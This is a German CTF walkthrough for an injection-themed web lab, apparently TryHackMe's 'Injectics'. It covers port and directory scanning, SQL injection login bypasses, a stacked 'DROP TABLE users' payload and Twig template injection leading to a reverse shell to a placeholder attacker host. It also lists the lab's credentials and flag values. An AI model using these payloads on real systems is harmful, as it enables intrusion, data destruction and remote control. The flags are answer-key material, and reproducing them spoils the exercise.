# Thema
Use your injection skills to take control of a web app.

# Vorgehen
## Scannen & Enumeration
### Nmap kontrolle der Offenen Ports via 
```
nmap -sV 10.10.149.236
```
Resultat: 
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
### Gobuster
```
gobuster dir -u "10.10.149.236" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.**txt**
```
Resultat: 
```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.149.236
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/flags                (Status: 301) [Size: 314] [--> http://10.10.149.236/flags/]
/css                  (Status: 301) [Size: 312] [--> http://10.10.149.236/css/]
/js                   (Status: 301) [Size: 311] [--> http://10.10.149.236/js/]
/vendor               (Status: 301) [Size: 315] [--> http://10.10.149.236/vendor/]
/phpmyadmin           (Status: 301) [Size: 319] [--> http://10.10.149.236/phpmyadmin/]
/server-status        (Status: 403) [Size: 278]
Progress: 218275 / 218276 (100.00%)
===============================================================
Finished
===============================================================

```

### Anschauen der Pagesource
via 
```
view-source:http://10.10.149.236/
```
 
Feststellung Namen, Nachnamen und mailadresse "Website developed by John Tim - `dev@injectics.thm`"
Feststellung der "login-php" für User der Hauptseite
Feststellung der "adminLogin007.php" für Admins der Site

## Erhaltene Infos
1. Ist ein Webserver mit Apache httpd 2.4.41
2. Es gibt diverse Direcorys in der Website die Vorhanden und teilweise offen sind 
3. Es handelt sich um einen PHP Server 

# Weiteres Vorgehen 
- Kontrolle auf welche Directorys zugriff besteht
	- Zugriff sonst nur auf den phpmyadmin -> Login seite für PHP
- Testen der Email adresse in allen Login portalen mit SQL Injection  
```
 ' OR '1'='1
```

Resultat 
Login und admin login kein Login möglich meldung " Invalid email or password. "
phpmyadmin site "Cannot log in to the MySQL Server" "mysqli_real_connect(): (HY000/1045): Access denied for user 'dev@injectics.thm'@'localhost' (using password: YES)"

Nächster Test auf der phpmyadmin
```
Username:  ' OR '1'='1
Password: ' OR '1'='1
```

Resultat:
 mysqli_real_connect(): (HY000/1045): Access denied for user ' ' OR '1'='1'@'localhost' (using password: YES)


->  Interessante Info Username kann nicht für Injektion genutzt werden Passwort Feld allerdings schon 


# Da Ich nicht weitergekommen bin nachlesen in WriteUp

mein Fehler war in der Enumeration mit gobuster diese hätte ich erneut mit anderer Wordliste und mehreren Parametern machen müssen

```
gobuster dir -u "10.10.149.236" -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x html,js,txt,php,db,json,log -k 2>/dev/null
```

-Resultate des Befehls: 
```


```

Mail.log enthält klare Anmeldedaten
- In `/mail.log` findest du zwei Accounts:
  ```
  superadmin@injectics.thm  | superSecurePasswd101
  dev@injectics.thm         | devPasswd123
  ```

SQLi im Login umgehen → erster Zugriff
- Das Login-Formular auf der Hauptseite filtert Schlüsselwörter wie `or`, `and`, `union`, `'` clientseitig – aber nur lowercase.
- Du umgehst das mit Payloads wie:
  ```
  username=' || 1=1 –-  (oder mit sleep für Zeit-basiert)
  ```
- Damit loggst du dich als „dev“-User ein.

 Zerstörung der `users`-Tabelle über Admin-SQLi
- Auf der Leaderboard-Seite (`edit_leaderboard.php`) kannst du Metadaten (z. B. gold, country) verändern – hier findet sich eine serverseitige SQLi-Lücke.
- Über einen Payload wie:
  ```
  gold=..., country=...; DROP TABLE users;-- -
  ```
  löschst du die gesamte `users`-Tabelle.

Automatische Wiedereinsetzung der Tabelle
- Der Dienst „injecticsService“ erkennt den Ausfall und stellt die Tabelle automatisch wieder her.
- Nach kurzer Wartezeit (1–2 Minuten) kannst du dich mit den Credentials aus `mail.log` als **superadmin** oder **admin** anmelden und bekommst damit **Flag 1**.

 SSTI im Admin-Bereich für RCE → Flag 2
- Im Admin-Dashboard gibt es ein Profil-Update, wo der Name angezeigt wird – und **SSTI** möglich ist (getestet mit `{{7*7}} → 49`).
- Über einen Twig-Trick (`sort('passthru')`) kannst du shell-Befehle ausführen, z. B.:
  ```jinja
  {{ ['bash -c "exec bash -i >& /dev/tcp/ATTACKER/PORT 0>&1"', ""] | sort('passthru') }}
  ```
  → Reverse Shell
- Alternativ kannst du die SSTI nutzen, um direkt Dateien auszulesen:
  ```jinja
  {{ ['cat /var/www/html/flags/XXXX.txt', ""] | sort('passthru') }}
  ```
  → Damit liest du **Flag 2** aus.

Flags & Endergebnis
- **Flag 1** (Admin-Panel): `THM{INJECTICS_ADMIN_PANEL_007}`
- **Flag 2** (Flag-Verzeichnis): `THM{5735172b6c147f4dd649872f73e0fdea}`
 Fazit
1. `/mail.log` → echte Admin-Creds  
2. SQLi → Login als dev  
3. SQLi im Leaderboard → `DROP TABLE users`  
4. Automatisch wiederhergestelltes Admin-Konto → Flag 1  
5. SSTI im Profil → RCE oder Datei-Lesen → Flag 2
